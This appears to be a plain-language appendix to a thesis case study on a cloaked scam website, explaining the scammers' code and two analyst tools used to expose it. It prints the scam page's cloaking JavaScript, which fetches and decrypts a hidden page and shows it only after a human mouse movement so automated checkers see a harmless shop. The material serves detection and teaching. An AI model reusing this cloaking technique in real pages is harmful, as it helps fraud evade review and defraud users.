The code involved — explained in plain English

The actual code pieces behind the case study. Each one is shown, then explained in simple words: what it is and what it does. No jargon.

Evidence · the scammer's code

AThe hidden trigger

This is the small piece of code found inside the innocent "shop" page — the part that quietly waits, then does the swap.

// two passwords, sitting right there in the page:
const PASSPHRASE = "98yNCjeAfWMwk0wI";   // unlocks the scam page
const URL_KEY    = "UrLk3yShopEase01";   // unlocks the hidden server's address
const ENC_DATA_ORIGIN = "U2FsdGVkX18Q…";    // the hidden address, kept scrambled

// unlock the hidden server's address using the first password:
const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY)…;

async function loadSecret() {
  // 1. download the scrambled scam page from the hidden server
  const res  = await fetch(DATA_ORIGIN + "/data?platform=" + detectPlatform());
  const { cipher } = await res.json();
  // 2. unlock it using the second password
  const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE)…;
  // 3. build the page in memory and show it, hide the shop
  frame.src = URL.createObjectURL(new Blob([html]));
  shop.style.display  = "none";
  frame.style.display = "block";
}

// THE TRIGGER: do nothing until the mouse moves once — then run it.
window.addEventListener("mousemove", loadSecret, { once: true });
What this does, in plain English
  1. It keeps two passwords right inside the page (that's the scammers' mistake that let analysts crack it).
  2. It uses the first password to reveal the address of a hidden server that was kept scrambled.
  3. The loadSecret part is the swap: download the scrambled scam page → unlock it with the second password → put it on the screen and hide the shop.
  4. The very last line is the whole trick: "wait for the mouse to move, then run the swap once." A checking-robot never moves a mouse, so it never runs — but a real person triggers it instantly.
Analyst tool · attacking the attackers

BUnlocking the scrambled page

This is a normal, free command an investigator runs to un-scramble the scam page — using the password the scammers carelessly left in their own code.

# feed it the scrambled text + the password → get the original back
openssl enc -aes-256-cbc -d -a -md md5 -pass pass:98yNCjeAfWMwk0wI -in scrambled.txt
What this does, in plain English
  1. You give it the scrambled gibberish and the password.
  2. It hands back the original scam page — readable again.
  3. This is only possible because the password was sitting in the page. Real protection would keep that password hidden, and this command would fail.
Analyst tool · attacking the attackers

CExposing the trap (pretending to be human)

This is the "attacking the attackers" part: a short script that opens the page like a robot, then fakes a mouse movement to force the hidden scam to reveal itself — so it can be caught, screenshotted, and reported.

with sync_playwright() as p:
    browser = p.chromium.launch()
    page = browser.new_page()
    page.goto("https://the-suspect-page/…")          # 1. open the innocent-looking page
    page.screenshot(path="1_what_a_robot_sees.png")  # 2. capture the clean 'shop'

    page.mouse.move(200, 200)                       # 3. FAKE a mouse movement (act human)
    page.wait_for_timeout(3000)                     # 4. give it a moment to swap
    page.screenshot(path="2_what_a_human_sees.png")  # 5. the hidden scam is now exposed
What this does, in plain English
  1. It opens the suspicious page automatically and takes a photo — this shows the harmless shop (what a robot sees).
  2. Then it pretends to move the mouse, tricking the page's own trap into firing.
  3. It takes a second photo — now showing the hidden scam. Side by side, the two photos prove the page is a cloak, which is exactly what you need to report it.

What is deliberately left out — and why

🚫 This is not a working scam kit. On purpose, the pieces that would let someone actually run this are not included here — the fake-shop page itself, the server that stores and hands out the scrambled scam, and the wiring that makes it auto-run. What's shown is only enough to understand the trick and to detect it. That's the whole point of the thesis: studying the attack in order to defend against it.
